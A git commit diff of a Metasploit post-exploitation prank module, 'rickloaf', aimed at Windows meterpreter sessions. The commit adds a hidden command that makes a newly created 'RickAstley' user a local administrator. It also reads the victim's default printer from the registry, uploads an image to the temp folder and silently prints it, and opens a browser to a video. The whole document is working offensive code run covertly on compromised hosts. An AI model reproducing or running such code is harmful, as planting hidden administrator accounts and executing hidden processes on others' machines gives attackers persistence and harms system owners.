8ad82321b267959b1b851c09183280a37db086a5
research <research@ubuntu.(none)>
2011-12-29 12:17:41 -0800

    got the default printer and found better way to print

--- modules/post/windows/pranksta_shit/rickloaf.rb
+++ modules/post/windows/pranksta_shit/rickloaf.rb
@@ -3,16 +3,17 @@ require 'msf/core/post/windows/accounts'
 
 class Metasploit3 < Msf::Post
 
-	include Msf::Post::Windows::Accounts
+	include Msf::Post::Windows::Registry
 
 	def initialize(info={})
 		super( update_info( info,
 			'Name'          => 'Windows Rickloaf Abuse Post module - Rick Astley will never give you up',
 			'Description'   => %q{
+					We're giving you more than the roll.  We're giving you the whole loaf.
 					This module aims to be a comprehensive Rick Astley Abuse script, because the pimp hand must stay strong.
 			},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'DJ Manila Ice', 'Ian Parker'], 
+			'Author'        => [ 'DJ Manila Ice', 'Ian Parker', 'crymsen', 'porkchop', 'BMack'], 
 			'Version'       => '1',
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -25,12 +26,13 @@ class Metasploit3 < Msf::Post
 
 	def run
 		if datastore["COMMAND"].eql? "cursor"
-			make_rick_astley_cursor
+			#make_rick_astley_cursor
+			print_status("command was set to cursor")
 		else
 			# do this by default for now
 			#make_rick_astley_cursor
 			#4.times do
-			#	launchIERickRoll
+			#launchIERickRoll
 			#end			
 			#add_rick_astley_user
 			print_rick_to_default_printer
@@ -77,13 +79,14 @@ class Metasploit3 < Msf::Post
 	def add_rick_astley_user
 		begin
 			session.sys.process.execute("net user RickAstley nevagonnagive /add", nil, {'Hidden' => true})
+			session.sys.process.execute("net localgroup administrators RickAstley /add", nil, {'Hidden' => true})
 		rescue::Exception => e
 			print_status("The following Error was encountered: #{e.class} #{e}")
 		end
 	end
 
 	def launchIERickRoll
-	  session.sys.process.execute("cmd.exe /c start iexplore http://www.youtube.com/watch?v=oHg5SJYRHA0", nil, {'Hidden' => true})
+	  session.sys.process.execute("iexplore.exe http://www.youtube.com/watch?v=oHg5SJYRHA0")
 	end
 	
 	def print_rick_to_default_printer
@@ -97,11 +100,21 @@ class Metasploit3 < Msf::Post
 		rick_picture_filename = "rick.png"
 		rick_png = ::File.join(path, rick_picture_filename)
 
-		
+
+		# printer registry key 
+		keychunk = registry_getvaldata("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "Device")
+		default_printer = keychunk.split( /, */, 0 )[0]
+		print_status("default printer is:" + default_printer)	
+
+		# this only applies to windows xp		
 		tempdir = client.fs.file.expand_path("%TEMP%")
 		temp_picture = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".png"
 		print_status "uploading to => " + temp_picture
 		session.fs.file.upload_file("#{temp_picture}", rick_png)
-		session.sys.process.execute("rundll32 shimgvw.dll ImageView_PrintTo /pt \"#{temp_picture}\" \"Brother HL-5370DW#:4\"", nil, {'Hidden' => true})
+		#session.sys.process.execute("rundll32 shimgvw.dll ImageView_PrintTo /pt \"#{temp_picture}\" \"#{default_printer}\"", nil, {'Hidden' => true})
+		drive = session.fs.file.expand_path("%SystemDrive%")
+		path = drive + '\\Program Files\\'
+		print_status("Printing rick out to the default printer")
+		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
 	end
 end
